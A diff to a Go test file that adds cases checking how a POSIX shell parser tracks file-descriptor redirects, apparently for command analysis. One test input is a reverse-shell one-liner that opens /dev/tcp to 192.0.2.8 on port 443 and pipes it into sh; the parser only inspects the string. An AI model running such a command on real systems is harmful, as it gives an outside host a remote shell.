@@ -2044,6 +2044,25 @@ func TestParsePOSIXReadWriteAndAllFDRedirects(t *testing.T) {
 		t.Fatalf("RdrAll projection = access=%q ok=%v fd=%d",
 			access, ok, posixRedirectFD(syntax.RdrAll))
 	}
+
+	feedback := parsePOSIX(`exec 3<>/dev/tcp/192.0.2.8/443; cat <&3 | sh >&3`, 1, 0)
+	if feedback.status != StatusComplete || len(feedback.commands) != 3 ||
+		len(feedback.commands[1].Redirects) != 1 ||
+		feedback.commands[1].Redirects[0].Target != "/dev/tcp/192.0.2.8/443" ||
+		len(feedback.commands[2].Redirects) != 1 ||
+		feedback.commands[2].Redirects[0].Target != "/dev/tcp/192.0.2.8/443" {
+		t.Fatalf("descriptor duplication was not completely resolved: %#v", feedback)
+	}
+	closed := parsePOSIX(`exec 3<>/dev/tcp/127.0.0.1/443; exec 3>&-; cat <&3`, 1, 0)
+	if len(closed.commands) != 3 || len(closed.commands[2].Redirects) != 1 ||
+		closed.commands[2].Redirects[0].Target != "" {
+		t.Fatalf("closed descriptor retained an earlier target: %#v", closed)
+	}
+	piped := parsePOSIX(`exec 3<>/dev/tcp/127.0.0.1/443 | cat; cat <&3`, 1, 0)
+	if len(piped.commands) != 3 || len(piped.commands[2].Redirects) != 1 ||
+		piped.commands[2].Redirects[0].Target != "" {
+		t.Fatalf("pipeline descriptor leaked into the parent shell: %#v", piped)
+	}
 }
 
 func TestParsePOSIXRedirectFactLimit(t *testing.T) {
